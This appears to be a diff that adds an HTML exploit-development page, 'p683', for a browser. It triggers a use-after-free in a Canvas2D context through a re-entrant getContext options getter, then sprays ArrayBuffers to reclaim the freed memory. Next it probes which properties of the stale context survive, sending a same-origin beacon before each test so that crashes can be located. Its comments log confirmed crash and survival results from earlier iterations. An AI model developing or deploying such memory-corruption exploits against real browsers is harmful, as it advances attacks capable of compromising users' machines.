@@ -1,0 +1,148 @@
+<!--
+  p683: Canvas2D AB(768) reclaim — property survival sweep
+  
+  CONFIRMED: webkitBackingStorePixelRatio survives on zeroed AB (p682 test=0)
+  CONFIRMED: .canvas crashes (p682 test=1)
+  
+  Strategy: test properties in order of safety. Beacon BEFORE each.
+  If process dies, the last beacon identifies the killer.
+  Use URL hash #N to skip the first N tests (resume after crash).
+  
+  Also test: JS introspection that doesn't touch C++ at all:
+  - typeof staleCtx
+  - staleCtx instanceof CanvasRenderingContext2D
+  - Object.keys(staleCtx)
+  - 'lineWidth' in staleCtx
+  - Object.getPrototypeOf(staleCtx)
+  - staleCtx.constructor
+  - staleCtx.toString()
+  
+  These JS-level checks might let us identify the AB index that reclaimed.
+  
+  CRASH_CLASS: HIGH (each property test may crash)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p683</title></head>
+<body>p683: property sweep
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P683-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+var f64=new Float64Array(1),u8f=new Uint8Array(f64.buffer);
+function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8f[i].toString(16)).slice(-2);return h;}
+
+var skip=parseInt(location.hash.slice(1))||0;
+emit('START','v1 skip='+skip);flush();
+var alive=[];
+
+// Canvas2D UAF + AB(768) spray
+var staleCtx=null;
+var abSpray=[];
+try{
+  var oc=document.createElement('canvas');oc.width=4;oc.height=4;
+  document.body.appendChild(oc);
+  var triggered=false,innerCtx=null;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{get:function(){
+    if(!triggered){triggered=true;innerCtx=oc.getContext('2d');}
+    return true;
+  }});
+  oc.getContext('bitmaprenderer',opts);
+  staleCtx=innerCtx;
+  
+  for(var i=0;i<50;i++){
+    var ab=new ArrayBuffer(768);
+    abSpray.push({ab:ab,u8:new Uint8Array(ab),dv:new DataView(ab)});
+    alive.push(ab);
+  }
+  emit('SETUP','uaf=ok spray=50');
+}catch(e){emit('SETUP-ERR',e.message);flush();return;}
+flush();
+
+// Test sequence — ordered from safest to most dangerous
+var tests=[
+  // JS-level introspection (no C++ calls)
+  {name:'typeof',fn:function(c){return typeof c;}},
+  {name:'instanceof',fn:function(c){return c instanceof CanvasRenderingContext2D;}},
+  {name:'constructor',fn:function(c){return c.constructor===CanvasRenderingContext2D;}},
+  {name:'toString',fn:function(c){return Object.prototype.toString.call(c);}},
+  {name:'getPrototypeOf',fn:function(c){return Object.getPrototypeOf(c)===CanvasRenderingContext2D.prototype;}},
+  {name:'in-lineWidth',fn:function(c){return 'lineWidth' in c;}},
+  {name:'hasOwn-lineWidth',fn:function(c){return c.hasOwnProperty('lineWidth');}},
+  {name:'keys',fn:function(c){return Object.keys(c).length;}},
+  {name:'getOwnNames',fn:function(c){return Object.getOwnPropertyNames(c).length;}},
+  // Known survivor
+  {name:'backingStorePixelRatio',fn:function(c){return c.webkitBackingStorePixelRatio;}},
+  // defineProperty shadow — can we shadow a getter?
+  {name:'shadow-lineWidth',fn:function(c){
+    Object.defineProperty(c,'lineWidth',{get:function(){return 42;},configurable:true});
+    var v=c.lineWidth;
+    delete c.lineWidth; // restore prototype getter
+    return v;
+  }},
+  // Now try actual C++ properties one by one
+  {name:'lineWidth',fn:function(c){return c.lineWidth;}},
+  {name:'globalAlpha',fn:function(c){return c.globalAlpha;}},
+  {name:'globalCompositeOp',fn:function(c){return c.globalCompositeOperation;}},
+  {name:'strokeStyle',fn:function(c){return c.strokeStyle;}},
+  {name:'fillStyle',fn:function(c){return c.fillStyle;}},
+  {name:'shadowOffsetX',fn:function(c){return c.shadowOffsetX;}},
+  {name:'shadowBlur',fn:function(c){return c.shadowBlur;}},
+  {name:'shadowColor',fn:function(c){return c.shadowColor;}},
+  {name:'lineJoin',fn:function(c){return c.lineJoin;}},
+  {name:'lineCap',fn:function(c){return c.lineCap;}},
+  {name:'font',fn:function(c){return c.font;}},
+  {name:'textAlign',fn:function(c){return c.textAlign;}},
+  {name:'canvas',fn:function(c){return c.canvas;}},
+  {name:'getTransform',fn:function(c){return c.getTransform();}},
+  {name:'save',fn:function(c){c.save();return 'ok';}},
+  {name:'beginPath',fn:function(c){c.beginPath();return 'ok';}},
+];
+
+var testIdx=0;
+function runNext(){
+  if(testIdx>=tests.length){
+    emit('SWEEP-DONE','all '+tests.length+' tests completed');flush();
+    return;
+  }
+  
+  var test=tests[testIdx];
+  
+  if(testIdx<skip){
+    testIdx++;
+    runNext();
+    return;
+  }
+  
+  emit('T'+testIdx,test.name);
+  flush(); // CRITICAL — beacon before the potentially crashing call
+  
+  try{
+    var result=test.fn(staleCtx);
+    var display;
+    if(typeof result==='number') display=result+' hex='+d2hex(result);
+    else if(typeof result==='boolean') display=String(result);
+    else if(typeof result==='string') display='"'+result.slice(0,40)+'"';
+    else if(result===null) display='null';
+    else if(result===undefined) display='undefined';
+    else display=typeof result+':'+String(result).slice(0,40);
+    
+    emit('T'+testIdx+'-OK',display);
+  }catch(e){
+    emit('T'+testIdx+'-THREW',e.name+':'+e.message.slice(0,60));
+  }
+  
+  testIdx++;
+  // Use setTimeout to let beacons flush between tests
+  setTimeout(runNext,10);
+}
+
+runNext();
+
+})();
+</script>
+</body>
+</html>
